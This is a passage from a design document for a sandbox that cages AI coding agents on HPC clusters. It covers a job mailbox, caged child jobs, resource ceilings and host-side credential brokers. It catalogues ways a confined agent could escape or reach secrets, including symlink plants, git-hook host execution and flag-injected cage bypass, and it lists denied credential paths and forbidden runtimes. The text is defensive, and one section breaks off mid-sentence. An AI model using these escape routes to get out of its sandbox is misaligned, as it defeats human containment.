IN-CONTAINER var — **considered and REJECTED**: blocking `,` in env values would
break legitimate values (`OMPI_MCA_btl=self,vader`, `UCX_TLS=sm,self`, PATH-lists,
JSON), and the issue is in-container-only where the attacker already controls
`env.values`; not worth the regression. (ii) the HPC `session_id`/`session_dir`
shell-shape guards keyed on `agent_exec_argv` while their consuming provenance
echo keys on `session_dir` — **CLOSED** (the guards now run whenever the fields
are set, tracking their actual sink; both are host-generated so never
attacker-reachable, pure defense-in-depth).

Tracked follow-ups (not yet fixed): managed-routes should be agent-plugin-only
(a non-agent plugin setting CLAUDE_CONFIG_DIR when no agent plugin claimed it);
the plugin bind-target envelope (`mount_target_prefixes`) is self-declared and not
tier-gated (a hostile manifest declaring `/` degrades it to allow-all,
backstopped only by the narrow target denylist).

## 4ae. Job-dispatcher directional mailbox (#54 P1, INV-1)

> INV-1 of the HPC job dispatcher: the directional mailbox. INV-2 (the caged
> child job) is §4af, the `botainer-job` CLI is §4ah, the daemon is §4ai.
> Full derivation: internal design note DN-001.

The mailbox lets the caged agent REQUEST jobs and READ results without ever
getting a write path an uncaged host process (dispatcher, slurmstepd) later reads
or executes through — the v0.0.x shared-rw `/jobs` symlink-escape class
(project_hpc_jobs_rw_folder_escape; same family as the S1 finding). Layout under
`StatePaths.hpc_jobs_dir(uuid)` = `<state_root>/hpc-jobs/<uuid>/`, which lives
OUTSIDE the container-bound `state/<uuid>/` subtree:

| dir | in-container | mode | why |
|---|---|---|---|
| `in/` | `/jobs/in` | **RW** | agent writes job requests; host reads with `O_NOFOLLOW` + skips symlink/non-regular/non-owned (dispatcher, P3) |
| `out/` | `/jobs/out` | **RO** | host writes status/logs; agent can't create files here, so it can't pre-plant a symlink where the host writes |
| `run/` | — (unbound) | — | host-private: generated `.sbatch` + SLURM `--output` logs; NEVER mounted into any container |

Only the two leaves are bound (never `root/`, never `run/`), and the whole
mailbox is outside the RW-bound `state/<uuid>/` — so binding does not transitively
expose `run/`, and the agent has no host write path to the sbatch scripts / logs.
`botainer/hpc/jobs.py` (`mailbox_for` / `ensure_mailbox` / `mailbox_binds`), added
to `security-surface-files.txt`. Pinned by `test_hpc_jobs_mailbox.py` (dirs 0700,
mailbox outside the bound subtree, in-RW/out-RO directionality, `run/` never a
bind source and no bind source is its parent).

## 4af. Job-dispatcher caged child job + never-bare-job chokepoint (#54 P1, INV-2)

> INV-2: a dispatched job runs ONLY in a caged container, never bare on the host.
> `botainer/hpc/jobs.py::compose_child_job_argv` + `assert_caged_child_job`.

A child job is `apptainer exec <§4 cage> <pinned .sif> <workload-argv>`:
- **Same §4 cage as the agent** — `--containall --cleanenv --no-privs --drop-caps
  all` (`_CHILD_CAGE_FLAGS`, drift-pinned to `ApptainerAdapter` by
  `test_hpc_jobs_child.py::test_child_cage_matches_adapter_section4_flags`).
- **Argv, never shell** — the agent's requested command is an argv OPERAND list
  after the image; a token full of shell metacharacters stays one element (the
  data-flow rule). No shell interpolation.
- **Entrypoint is not a runtime / the agent** — `command[0]` basename may not be
  `apptainer`/`docker`/`podman`/`runc`/… or `botainer`/`claude`/`codex` (#148
  forbidden-runtime + never-botainer). Later args are the workload's business
  (the cage bounds them), so a filename/pattern like `docker` is fine.
- **No credentials** — binds are validated with the mount-plan path safety + the
  (ancestor-aware) source denylist (so a child bind can't smuggle `/etc` or creds
  via `source`), and credential/home TARGETS (`/home`, `/root`, `~/.claude`,
  `~/.codex`, `~/.ssh`, `~/.config`) are refused. A child gets `/workspace`,
  `/packages`, `/scratch`, `/apps`(ro) — never home/creds/ssh.
- **Structural mask invariant (sharp-edges).** The `.botainer` mask
  used to be an emergent property of the session composition helper — NOTHING
  enforced it, so the JOB bind path silently omitted it and exposed config.yaml
  (same class as the umbrella-bind postmortem). Now
  `mount_plan.validation.assert_mask_invariants` REFUSES any plan binding
  `/workspace` RW without a `/workspace/.botainer` mask (NULL_BIND/RO), ordered
  AFTER the RW parent (apptainer applies binds in order), sourced OUTSIDE the
  parent. Called by BOTH `validate()` (session) AND `compose_child_job_argv`
  (jobs), so neither pipeline can omit it. The WHOLE `/workspace/.git` is RO-
  frozen for jobs (`_child_git_binds`) so a caged job can't plant a host-executed
  hook or poison config (a host-code-exec escape the session gets from the git
  plugin, which jobs don't run). Fails CLOSED like the plugin: refuses a `.git`
  gitdir POINTER (worktree/submodule) and a repo whose `.git/config` already
  carries a host-exec key, using the SHARED section-aware scanner
  `core/gitconfig_scan.py` — one audited parser for plugin + jobs (the earlier
  job-side substring copy missed sectioned keys like `[core] pager` and
  `[include]` indirection; sharp-edges re-audit F1/F2/F3). The git
  plugin keeps its OWN copy of the key sets (the hook must stay self-contained —
  it may run under a python where botainer isn't importable), guarded by
  `test_git_plugin_scanner_matches_shared_module` so the two audited parsers
  can't silently diverge.
- **Project binds (#68, IMPLEMENTED; packages RW).** The
  `/workspace`(rw), `/packages`(RW — a job may compile/install, e.g. MPI/GPU
  builds), `/scratch`(rw) binds are now actually populated —
  `jobs.child_core_binds(project_root, proj_paths, state_dir)` builds them and the
  dispatcher (`cli/hpc.py::_run_dispatcher_cycle`) + the warm-worker loop
  (`pool.worker_loop`) pass them into `compose_child_job_argv`. Before this, jobs
  got ZERO binds and could not see `/workspace` (the docstring was aspirational).
  Sources are the project's OWN dirs: `/workspace`←project_root, `/packages` and
  `/scratch`←`proj_paths` under the user state dir, symlink-escape-guarded (a
  swapped `packages`/`scratch` symlink resolving outside the state dir is Refused,
  mirroring task #239 / `compose_session`). `/packages` is RW (a job may build/
  install into the shared tree — same trust level as the session, which also has
  it RW). Every bind still passes `_child_bind_flags` (source denylist +
  forbidden-target) AND `assert_mask_invariants` (above). Cluster software roots +
  module env are the next bullet.
- **Cluster software + module exposure (#68, IMPLEMENTED).**
  `jobs.child_cluster_contribution(effective_policy)` adds, ON wherever the SITE
  configures it (empty = OFF, safe default): RO IDENTITY binds (source==target)
  for `mounts.cluster_software_roots` + `cluster_lmod_root` +
  `cluster_modulepath_roots`, plus `--env` for `MODULEPATH`/`LMOD_*`/`BASH_ENV`
  so `module` works inside a caged job. These are the SAME root-owned SitePolicy
  anchors the SESSION uses — user/project policy CANNOT widen them (self-grant
  defense); RO + `--no-privs --drop-caps all` grants the (public) software tree
  nothing writable. Every root still flows through `_child_bind_flags`
  (source/target denylist), so an /etc-class root is Refused. Env reaches the job
  as `--env KEY=VAL` (`_child_env_flags`: key a strict identifier, value rejects
  control chars) BEFORE the image — never a shell mutation of the argv.
- **Per-profile `module load` (#68, IMPLEMENTED).** A profile's
  `modules:` list is auto-loaded inside the caged job before the workload via
  `_module_preamble_workload`: `bash -c 'module load <names>; exec "$@"' bash
  <original argv>`. The ONLY interpolation is the CONFIG module list, which
  `JobProfile._validate_modules` restricts to a flat Lmod token
  (`^[A-Za-z0-9_./+-]+$`, no shell metachars); the agent's command is passed as
  positional params and re-exec'd verbatim (`exec "$@"`), NEVER reparsed as shell
  — the argv-not-shell invariant holds. The ORIGINAL command's entrypoint is
  validated BEFORE the wrapper (a forbidden runtime is still caught). Fail-closed:
  a profile listing `modules:` while the module system is not exposed (no
  `BASH_ENV`) is Refused. Three-state (absent/`[]` → none, `[list]` → those).
  Cold path auto-preloads; warm/hot exposes the module system but does not yet
  auto-preload (a hot task can `module load` itself) — a documented follow-up.
- **Frozen-plan chokepoint** — `assert_caged_child_job` re-verifies all of the
  above from the FINAL argv (mirrors `SubmissionPlan.__post_init__`), so no
  construction path can hand `sbatch` a bare/uncaged/cred-bearing job. The agent
  cannot choose the image or the cage flags.
- **Per-profile image is AUTHOR-set, never agent-set (#68 MPI).** A profile may
  set `image:` to run its jobs in a different `.sif` (an MPI/PMI-matched image)
  than the session image; `dispatcher.submit_request` resolves `profile.image or
  <session image>`. This is config (the untrusted-but-validated `job_profiles`),
  NOT the agent's mailbox request — the agent still cannot pick the image. The
  cage flags are emitted by `compose_child_job_argv` regardless of which image
  runs, so a swapped image is still §4-caged. `config.py::JobProfile` validates
  the image is not `-`-prefixed (it is an `apptainer exec` operand; a leading dash
  would parse as a flag = cage-bypass) and has no control chars.
Pinned by `test_hpc_jobs_child.py` (cage present, argv-not-shell, forbidden
entrypoints, control-char refusal, credential-target + denied-source refusal,
safe-binds-with-ro, and the chokepoint rejecting bare/uncaged argv).

## 4ag. Job `job_profiles` config + JobPolicy ceiling (#54)

> The resource-CAP model + its trust boundary. `job_profiles` in the
> git-shareable project config are UNTRUSTED; the root-owned site-policy
> `JobPolicy` ceiling is the real boundary (same rule as network.mode /
> agent_permissions / mounts.extra).

- **Config (`config.py::JobProfile` + `ProjectConfig.job_profiles`):** a named,
  capped resource shape — `partition/time/cpus/memory/gpus/gpu_type/account/
  modules/max_concurrent/array_max`, plus jobs-v2 MPI/multi-node
  (`nodes/ntasks/ntasks_per_node/exclusive`) and the per-profile `image:` (§4af).
  The agent picks a profile BY NAME; jobs v2 also allows BOUNDED per-request
  overrides of `cpus/memory/gpus/nodes/time` capped by the profile's opt-in
  `max_*` (`resolve_resources`), re-checked against the site ceiling.
  Parse-time defense-in-depth: sbatch-directive fields
  (`partition/account/gpu_type/memory/time`) are charset-restricted
  (`^[A-Za-z0-9._:+-]+$`, no injection); counts non-negative; profile NAMES are
  flat tokens (they flow into the mailbox request + match this dict); `image:` is
  operand-safe (no leading `-`, no control chars, §4af). Two warm-pool combos are
  fail-closed (a warm worker runs a single caged `exec` in the session image, so
  it can neither honor a per-profile image nor srun-launch across an allocation):
  `image:`+`warm_pool_size:` (would run the wrong `.sif`) and MPI/multi-task
  (`nodes>1`/`ntasks`/`ntasks_per_node`)+`warm_pool_size:` (a hot task would run
  non-parallel). Both are refused at BOTH parse (`JobProfile` model-validator) AND
  the runtime chokepoint (`_start_pool_workers`, which all three start paths —
  auto-warm, agent `pool start`, CLI — funnel through), so the agent-reachable
  runtime `pool start` can't slip past the parse-time check. Cold submits run MPI
  correctly under `srun` (`render_child_sbatch`).
- **Ceiling (`policy.py::JobPolicy` + `check_profile_against_ceiling`):**
  `allowed_partitions` / `allowed_accounts` (empty = no restriction),
  `max_gpus_per_job` / `max_concurrent_cap` (None = no cap). Defaults PERMISSIVE
  (no site policy → Slurm/the account is the backstop); a multi-tenant admin
  LOWERS them. The dispatcher calls `check_profile_against_ceiling` before
  composing/submitting — a tampered profile exceeding the ceiling is refused
  (`CAPABILITY_DENIED_BY_POLICY`, fail-closed per dimension). `intersect` uses
  empty-means-all "most restrictive" for the allowlists + `min` for the caps
  (site restriction can't be widened by an empty user policy).
Pinned by `test_job_profiles.py` (parse + injection/negative refusal + name
token; default permissive; per-dimension ceiling refusal; intersect semantics).

## 4ai. Job-dispatcher daemon core (#54 P3)

> The host-side loop that turns a `pending` request into a caged sbatch job.
> `botainer/hpc/dispatcher.py`. `sbatch`/`squeue`/`scancel` are injected callables
> so the security logic is unit-testable without a scheduler.

Per inbox request `/jobs/in/<id>.json`:
1. **`read_request_safely`** — `os.open(O_RDONLY|O_NOFOLLOW|O_NONBLOCK)` then
   `fstat`: regular file, owned-by-me, not world-writable. INV-1 host side — the
   inbox is agent-writable, so a symlink is refused (O_NOFOLLOW) and a planted
   FIFO can't block the open (O_NONBLOCK) — a DoS-plant is refused, not hung.
2. **`validate_request`** (fail-closed) — id 16-hex; profile ∈ `job_profiles`;
   **`check_profile_against_ceiling`** against the root-owned `JobPolicy` (the
   real boundary — the profile is untrusted); command a non-empty argv list.
3. **`compose_child_job_argv`** (INV-2 §4 cage) → **`render_child_sbatch`**: a
   `run/<id>.sbatch` whose `--output`/`--error` go to the **host-private `run/`**
   (never the agent-writable mailbox — S1 discipline), `#SBATCH` from the
   validated profile (shlex-quoted), body `exec`s the shlex-quoted caged argv.
4. **`sbatch`** → `out/<id>.status.json = queued` (with the slurm jobid).
A validation failure writes `out/<id>.status.json = refused` with the reason (so
the agent sees WHY) and NEVER raises to the loop. `process_inbox_once` skips
requests already in `out/` (idempotent). Added to `security-surface-files.txt`.
Pinned by `test_hpc_dispatcher.py` (queues a caged job with host-only output;
unknown-profile / ceiling-exceeded / runtime-command refused with reason;
already-processed skipped; symlink + FIFO inbox entries refused).

**Runtime + CLI:** `poll_running(mailbox, running_slurm_ids)`
advances queued→running→completed from a `squeue` snapshot and copies the
host-only `run/<id>.out/.err` into `out/<id>.stdout/.stderr` (agent RO — it never
sees `run/`). `botainer hpc dispatcher {once|start|status}` (`cli/hpc.py`,
`_run_dispatcher_cycle`) resolves a project's `job_profiles` + effective
`JobPolicy` + the child image (the pinned agent `.sif`) + mailbox, then
`process_inbox_once` (real `sbatch --parsable`) + `poll_running` (real `squeue`)
+ `scancel` on `<id>.cancel` markers. `once` = cron shape; `start` = foreground
loop (daemon-vs-cron, both supported). The security decisions all live in the
tested core; the CLI is thin glue.

## 4aj. Credential-broker sentinel exception (opt-in)

> The enabling change for the credential broker (§4ak), which replaces the
> non-functional `agent-claude-proxy` (#62): the container holds a provably-fake
> SENTINEL instead of a real token, and the broker injects the real credential
> host-side on the outbound leg. This is the ONE change to existing core code the
> broker needs; the daemon and the plugin are additive and opt-in.

`check_env_for_leaks` now spares a credential-shaped env var whose VALUE is a
broker sentinel (`core/broker_sentinel.is_sentinel` —
`BROKER-SENTINEL.tenant=…nonce=…NOT-A-REAL-CREDENTIAL`). The sentinel carries no
secret, so it is not a leak — this is precisely why the old proxy (which injected
a real-shaped `ANTHROPIC_API_KEY`) was refused. The exception is value-based and
narrow: any REAL-looking value under the same name is STILL refused
(`test_credential_leak_check.py::test_broker_exception_does_not_weaken_the_guard`).
No behavior change for any existing session (nothing emits a sentinel yet).

## 4ak. Credential broker: agent-claude-broker plugin + botainer/broker daemon

> The functional replacement for the dead `agent-claude-proxy` (T0-3/#59). Opt-in
> auth mode (`botainer auth use broker`). Builds on the sentinel exception in
> §4aj. Adversarially audited (red-team pass); HIGH/MEDIUM/LOW findings folded in.

**Design.** The real Anthropic credential (botainer's OWN `botainer auth login`
store — shared-auth or the isolated per-project profile; NEVER the host's native
`~/.claude`/macOS Keychain, which are unreadable anyway) stays host-side in a
broker daemon. The container is given ONLY:
- `ANTHROPIC_AUTH_TOKEN` = a provably-fake sentinel (`BROKER-SENTINEL.…`),
- `ANTHROPIC_BASE_URL` = the local broker,
- `CLAUDE_CONFIG_DIR=/home/agent/.claude`.
Every Anthropic request flows through the broker, which strips the client's
sentinel + all credential/hop-by-hop headers and injects the real
`Authorization: Bearer <access>` + `anthropic-beta: oauth-2025-04-20` (merged
with any client betas) host-side. The real token never enters the container
(empirically confirmed: a caged agent asked to print the credential finds only
the sentinel).

**Transport (runtime-dependent).**
- apptainer / native-Linux Docker: a **unix socket** at
  `<state_root>/run/brk-<sid>.sock` (short path — fits the ~104-byte sun_path
  limit that the deep session dir overflows), mode 0600 in a 0700 dir, bound at
  `/run/anthropic-broker.sock`. The socket mode IS the access boundary.
- Docker Desktop (macOS/Windows) cannot bind a host unix socket across its VM,
  so a **loopback TCP** listener on `127.0.0.1:<ephemeral>` is used, reached from
  the container via `host.docker.internal`. NO bind. Because a loopback port has
  no uid boundary, every request MUST present the per-session sentinel as its
  bearer (constant-time compare) — the sentinel lives only in the container
  (64-bit random nonce, not host-readable).

**Binds contributed** (declared in the manifest `mount_target_prefixes`
envelope; composition refuses anything outside it):
- `/run/anthropic-broker.sock` (unix transport only).
- `/home/agent/.claude` ← a DEDICATED broker-state dir
  (`…/data/agent-claude/broker-state/<profile>`) that holds session history /
  `.claude.json` only and NEVER a credential (so persistence works without
  reintroducing the mount-mode credential exposure).

**Env contributed:** `ANTHROPIC_AUTH_TOKEN` (sentinel — allowed by the §4aj
leak-guard exception), `ANTHROPIC_BASE_URL`, `CLAUDE_CONFIG_DIR`. On the unix
transport (apptainer) also `ANTHROPIC_UNIX_SOCKET=/run/anthropic-broker.sock`
(the mechanism Claude Code ≥2.1.118 actually uses for HTTP-over-socket — a plain
path, with `ANTHROPIC_BASE_URL=http://localhost`; an `http+unix://` base URL is
silently dead) + `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` (telemetry doesn't
ride the socket).

**Daemon security invariants** (`botainer/broker/daemon.py`, red-team-verified):
pinned https upstream + NO redirect following (no cross-origin credential leak);
path allowlist `/v1/` with dot-segment + percent-encoding rejection; `Accept-
Encoding` forced to identity (a compressed body would reach the client
mislabeled); response sanitized to Content-Type/Content-Encoding only (never an
upstream auth header); **streams** the response (Claude Code SSE); fail-CLOSED
502 on any credential-unavailable; body-size cap + worker cap; parent-death
watchdog (shuts down if the launcher dies without post_session).

**Config-trust:** the ONLY project-settable field is `credential_scope`
(shared|isolated — selects WHICH of the user's own stores to read; cannot move a
credential off-host). Upstream + OAuth token_endpoint/client_id are PINNED as
trusted CONSTANTS in the hook (untrusted `.botainer/config.yaml` must not be able
to redirect where the real credential — especially the durable REFRESH token —
is sent). Host-side refresh is ENABLED: an expired access token is
refreshed against `api.anthropic.com/v1/oauth/token` (client_id verified across
3 independent implementations; JSON body; the rotated refresh token is written
back atomically to botainer's own store, never the container) so a session does
not fail daily on token expiry. The refresh token never enters the container.

**Mutual exclusion:** `mutually_exclusive_with` the mount + proxy anthropic
variants; compose refuses two anthropic-family plugins. Broker mode's capability
disclosure asserts no agent credential bind is present.

**Refusal categories added:** `BROKER_CREDENTIAL_UNAVAILABLE`,
`BROKER_REFRESH_FAILED` (`botainer/core/refusal.py`).

**Audit #2 (end-to-end) hardening:** no HIGH/CRITICAL — the
credential-read/exfiltration surfaces were verified solid. Folded-in LOWs: the
host-side debug log is created 0600 + O_NOFOLLOW (was default umask); the
sun_path `/tmp` fallback dir is `exist_ok=False` + `XDG_RUNTIME_DIR` added to the
hook-env allowlist so the per-user 0700 runtime dir is preferred on HPC; the
TCP-readiness probe re-checks the daemon PID (ephemeral-port TOCTOU); the consent
fingerprint normalizes ephemeral socket-bind sources (was re-prompting every
apptainer launch → consent fatigue). **M1 (parity, tracked):** broker mode needs
compose+run on the SAME node, so on HPC it is salloc/interactive-only — the
sbatch compose-at-submit path can't reach a login-node broker (surfaced in the
capability summary); the fix is a compute-node-side daemon.

## 4al. HPC job-dispatcher auto-start

> Surface-NEUTRAL: the mailbox (INV-1), the caged child job
> (INV-2), and the JobPolicy ceiling are UNCHANGED — this only auto-runs the
> existing, tested dispatcher so agent-submitted jobs actually execute.

When a session's composed spec has jobs enabled (the `/usr/local/bin/botainer-job`
bind is present, i.e. the project declared `job_profiles`) AND `sbatch` is on
PATH, `cli/start.py` spawns the dispatcher poll-loop
(`botainer hpc dispatcher start`) as a **detached host-side background process
for the session's lifetime** (`botainer/hpc/autodispatch.py`). Previously the
dispatcher had to be started manually, so submissions sat `pending` and the agent
was (wrongly) told to have the user start it. The spawn is fully guarded (any
failure warns + returns None; the session launches regardless); the loop carries
a launcher-PID watchdog (self-exits if the launcher dies); `stop()` reaps it at
session end. It runs as the invoking user with only the host's own `sbatch`/
`squeue` — no new bind, env-to-container, or credential surface. On a non-
scheduler host (`sbatch` absent) nothing is spawned and requests stay pending.

## 4am. HPC MPI / multi-node job profiles (#68 part 1)

Job profiles gained `nodes` / `ntasks` / `ntasks_per_node`. The dispatcher emits

## 4an. HPC warm/hot worker pool (#68 part 2)

Persistent "warm" workers (a `botainer hpc pool worker` loop inside a held sbatch
allocation) run agent tasks immediately — no per-task SLURM queue wait. Trust
model is UNCHANGED from the cold path: each task the worker runs is composed by
`jobs.compose_child_job_argv` and re-verified by `jobs.assert_caged_child_job`
(INV-2 §4 cage — pinned image, argv workload, no credentials). The per-worker
mailbox lives under the mailbox `run/pool/<worker_id>/` — HOST-PRIVATE, never
bound into any container; the agent reaches results only through the main
mailbox out/ (RO). The agent drives it via `botainer-job pool start/stop/status`
+ `submit --hot`; `pool start` and hot tasks are bounded by the root-owned
`JobPolicy` (partition/account/gpus/nodes/max_concurrent) checked at submit, and
the pool size can't exceed the profile's `max_concurrent`. Workers self-exit on
an idle timeout or a host-written STOP marker. The dispatcher routes a `hot`
request to an idle worker for the matching profile, falling back to a cold job if
none is free. (Logic unit-tested; end-to-end pool execution needs live-cluster
validation.)

**Config-declared auto-warm + bugfix.** A job profile may set
`warm_pool_size` (+ `warm_pool_idle_timeout`); the dispatcher then AUTO-STARTS that
many caged workers ONCE at session start (idempotent per dispatcher process; not
re-warmed after idle-release), so the agent's `--hot` submits run instantly with
no runtime `pool start`. Bounded identically (max_concurrent + the root JobPolicy
ceiling), via one shared `_start_pool_workers` sink. NOTE: this also fixed a class
of dead code — pool control (`_handle_pool_control`) was called with an undefined
`proj` (a `NameError` swallowed by the per-cycle guard) AND used an unimported
`secrets`, so ALL pool control — agent `pool start`, `--hot`, and any warm pool —
had **never** actually run. Now exercised end-to-end in tests
(`test_warm_pool.py`).

## 4ao. Jobs v2 — per-request resource overrides bounded by opt-in max

Job profiles gained optional `max_cpus/max_memory/max_gpus/max_nodes/max_time`
(the ceiling the agent may request UP TO) + a `notes` field. The agent's
`botainer-job submit --cpus/--mem/--gpus/--nodes/--time` sends overrides;
`botainer/hpc/resources.resolve_resources` (a pure, unit-tested function called
at the dispatcher sink) computes the EFFECTIVE resources and REFUSES an override
that (a) exceeds the profile's `max_*` or (b) targets a resource with no `max_*`
(fixed). The resolved gpus/nodes are re-checked against the root `JobPolicy`
ceiling (`check_profile_against_ceiling`) — so: agent request ≤ profile max ≤
site policy. Values pass the existing strict-charset/int validators
(sbatch-injection defense). `notes` is verbal guidance surfaced to the agent
ONLY via `botainer-job profiles` command output (not the system prompt), so it
is not a prompt-injection channel into the agent's instructions. No override can
raise a resource above what the profile author already set as the max; and the
RESOLVED cpus/memory/time/gpus/nodes are ALL re-checked against the root-owned
site `JobPolicy` at submit (`max_cpus_per_job` / `max_mem_mb_per_job` /
`max_time_seconds_per_job` / `max_gpus_per_job` / `max_nodes_per_job`; `None` =
uncapped), so `agent request ≤ profile max ≤ site policy` holds for every
dimension. The profile is untrusted (git-shareable); the JobPolicy is not.

**Hardening (audit).** A caged agent can write raw request JSON
straight into the mailbox `in/` (bypassing the `botainer-job` argparse), so every
override field is attacker-typed:
- **Typed-JSON DoS (was HIGH).** A non-string `memory`/`time` override (int, list,
  dict, bool) hit `(v or "").strip()` and raised `AttributeError`/`TypeError` —
  NOT the `ValueError` the callers caught — so it escaped `submit_request` and the
  dispatcher poll loop, killing the daemon; the request never got a status file so
  it was re-read and re-crashed every restart (silent, permanent job-dispatch DoS).
  Fixed at three layers: `resources.parse_mem_mb/parse_time_seconds` normalize a
  non-string to `ValueError`; `resolve_resources` catches `(ValueError, TypeError)`
  → `Refused`; `dispatcher.submit_request` now fails closed on **any** exception
  (records a `refused` status so the poison is marked processed, never replayed)
  and the `cli/hpc.py` dispatcher loop catches `Exception` per-cycle so no single
  request can ever kill the daemon.
- **`notes`/`description` sanitized (was MEDIUM).** These free-text fields come
  from the untrusted, git-shareable config and are NOT covered by the sbatch
  charset guard. `jobs.write_profiles_manifest` now control-char-scrubs + length-
  caps them (`_scrub_profile_text`) before they reach the agent's terminal via
  `botainer-job profiles`, killing ANSI/escape smuggling. They still never enter
  the launcher-static AGENT_HINTS system-prompt chain.
- A blank/whitespace-only override is normalized to "no override" (uses the
  profile default) rather than being refused or silently zeroing the directive.
- **`max_concurrent` is now ENFORCED (was declared-only).** `process_inbox_once`
  counts a profile's live queued/running/assigned jobs and DEFERS a new request
  (status `deferred`, retried when a slot frees) once the profile is at
  `max_concurrent`, instead of sbatch'ing every request. Before, `max_concurrent`
  bounded only warm-pool size + the declared-value ≤ site-cap check, so the true
  aggregate (max_concurrent × max_nodes nodes for a profile) had NO botainer
  bound — only SLURM/QOS. Now the concurrency cap is real; SLURM/QOS remains the
  backstop for the aggregate node count (botainer has no cross-profile total-node
  cap — a tracked follow-up if multi-tenant aggregate limits are needed).

## 4ap. Codex credential broker — API-key mode (agent-codex-broker)

The OpenAI analog of the Claude broker (§4ak). `agent-codex-broker` (family
`openai`, mode `broker`; mutually exclusive with the codex mount variants) holds
botainer's OWN codex API key host-side and hands the container a provably-fake
`OPENAI_API_KEY` sentinel + an `OPENAI_BASE_URL` pointing at a per-session broker.
The broker daemon (`botainer/broker/daemon_main.py`, now provider-parameterized:
`--provider openai`) strips the container's sentinel Authorization and injects the
real `Authorization: Bearer sk-…` read fresh from
`shared-auth/agent-codex/auth.json` (`OPENAI_API_KEY` field) or the per-project
`api_key` file via `broker/openai_credential.OpenAICredentialBroker`, then forwards
to the PINNED `https://api.openai.com` (`/v1/` allowlist), never following
redirects. The real key never enters the container; the daemon fails closed if it
can't produce a key.

Delta from the Claude broker: **TCP-only transport.** Codex has no unix-socket
support, so the broker always listens on loopback TCP (127.0.0.1 reachable under
apptainer's shared netns; `host.docker.internal` under Docker Desktop). A loopback
port has no uid boundary, so the daemon REQUIRES every request to present the
per-session sentinel as its access token (`required_client_token`, constant-time
compared).

**Two auth modes, auto-detected from botainer's own codex login store** (the hook
reads it and picks the mode; the container is never told which):

**HOW CODEX IS POINTED AT THE BROKER: a FILE, not an env var.** This is the one
place botainer's two brokers differ in mechanism. Claude Code follows
`ANTHROPIC_BASE_URL`; codex does **not** follow `OPENAI_BASE_URL` for its model
calls, on either auth path — measured against codex 0.153.2 on 2026-09-04, it
goes to `chatgpt.com/backend-api/codex` (subscription) or
`wss://api.openai.com/v1/responses` (API key) regardless. So the hook writes
`$CODEX_HOME/config.toml` into the broker-state dir with a `model_providers`
entry: `base_url` = the per-session broker, `wire_api = "responses"`,
`env_key = "OPENAI_API_KEY"` (the sentinel), `requires_openai_auth = false`
(this is what stops codex demanding a login), `supports_websockets = false`
(the WebSocket transport ignores the configured base URL). That file **is** the
routing. It carries no secret, is rewritten every session, and is agent-editable
without effect: an edit can only redirect the SENTINEL, which is not a
credential, and the daemon still refuses anything not presenting it.

**No `auth.json` is written into the container, in either mode**, so nothing in
the cage holds or attempts an OAuth refresh. A stale stub left by an earlier
botainer is deleted at start — the broker-state dir outlives the session, and a
leftover stub puts codex into ChatGPT mode where it contacts chatgpt.com
directly and bypasses the broker entirely.

`OPENAI_BASE_URL` is still set. It no longer routes codex, and is retained
because it is the only thing check 3 of `_refuse_cross_node_binds` can see for
this TCP-transport plugin (which contributes no bind): without it `hpc submit`
would bake a login-node `127.0.0.1` into an sbatch script that runs on a compute
node. Ordinary OpenAI-SDK clients in the container also honour it and reach the
broker. Pinned by `test_broker_endpoint_stays_visible_to_the_cross_node_guard`.

1. **API-key** (auth.json `OPENAI_API_KEY` or the per-project `api_key` file).
   Provider `openai`; upstream pinned `https://api.openai.com`; `/v1/` allowlist;
   container provider `base_url = <broker>/v1`; inject `Authorization: Bearer sk-…`
   (`broker/openai_credential.OpenAICredentialBroker`). No refresh — keys don't
   expire.
2. **ChatGPT subscription** (auth.json with a `tokens` object). Provider
   `openai-chatgpt`; upstream pinned `https://chatgpt.com`; `/backend-api/codex/`
   allowlist; container provider `base_url = <broker>/backend-api/codex`. The
   `broker/openai_oauth.CodexOAuthCredentialBroker` reads the OAuth bundle,
   refreshes the access token host-side at the PINNED
   `https://auth.openai.com/oauth/token` (client_id `app_EMoamEEZ73f0CkXaXp7hrann`,
   both baked constants — never config), **persists the rotated refresh token**
   back to auth.json (0600, atomic; else the ChatGPT backend's reuse-detection
   locks the account), and injects `Authorization: Bearer <oauth-access>` +
   `chatgpt-account-id: <account_id>`. Expiry is read from the access-token JWT
   `exp` (5-min window; `last_refresh + 8d` fallback). The request BODY is
   forwarded verbatim — codex sends the identical Responses-API body to both
   backends (verified against `openai/codex` source), so no body-rewrite is done.
   The real tokens (access + durable refresh) never enter the container.

The daemon fails closed in both modes (no usable credential → refuse to start).
`credential_scope` (shared|isolated) is the ONLY project-settable field and only
selects WHICH of botainer's own login stores to read — it can't redirect the
credential off-host or choose the auth mode. A dedicated broker-state dir is bound
at `/home/agent/.codex` (holds NO credential) so codex remembers session state +
the entrypoint can write AGENTS.md.

> **Subscription-mode residual risk (unverified end-to-end).** The ChatGPT
> backend may require an `x-oai-attestation` token that a pure api→chatgpt rewrite
> proxy cannot mint (codex only computes it in native ChatGPT-auth mode). If a live
> ChatGPT-codex login 401/403s through the broker with a valid Bearer +
> account-id, attestation is the likely cause. This path is unit-tested (refresh,
> rotation, header injection, mode routing) but NOT yet confirmed against a live
> chatgpt.com request; verify on a real ChatGPT-codex login before relying on it.
> ToS posture mirrors the Claude broker (see internal design note DN-011).

**Broker hardening (adversarial audit; both brokers).** The 4-pass
audit (internal design note DN-012) found NO credential-exfiltration
loophole; the fixes were availability + one HPC lockout hazard:
- OAuth refresh is now serialized cross-process by `broker/refresh_lock` (flock, or
  an O_EXCL lockfile on lock-less filesystems) and FAILS CLOSED rather than
  spend a rotating refresh token unserialized — a concurrent double-refresh on
  shared NFS would otherwise trip the provider's reuse-lockout and lock the account.
- The daemon caps concurrent handler threads (`MAX_CONNECTIONS`) at accept and
  bounds the request-body read with a wall-clock deadline (slowloris guard); a
  failed refresh backs off instead of hammering the OAuth endpoint. The path
  filter also rejects double-encoded separators; the TCP sentinel is 128-bit;
  response-body-head logging is opt-in (`BOTAINER_BROKER_DEBUG_BODIES=1`).
The residual exposure is the inherent same-uid floor of a host-side proxy (a
process running as the invoking user can read the daemon's memory or the
credential file directly); the caged container agent — the actual threat model —
cannot.

## 4ar. HPC multi-node MPI PMIx handshake through the §4 cage (#68 part 3)

> §4am shipped the `nodes`/`ntasks` directives + the `srun`-per-rank launch, but
> NOT the PMIx plumbing — so multi-node jobs booted as N isolated rank-0 singletons
> ("PMIx namespace" error). This completes the cross-node handshake using the
> ESTABLISHED apptainer+SLURM+PMIx recipe (internal design note DN-001 §9 Q2;
> CHTC/PSU/Plymouth HPC guides). The §4 cage flags are UNCHANGED.

**New capability (env + one bind crossing INTO the cage, AUTHOR-gated).** A job
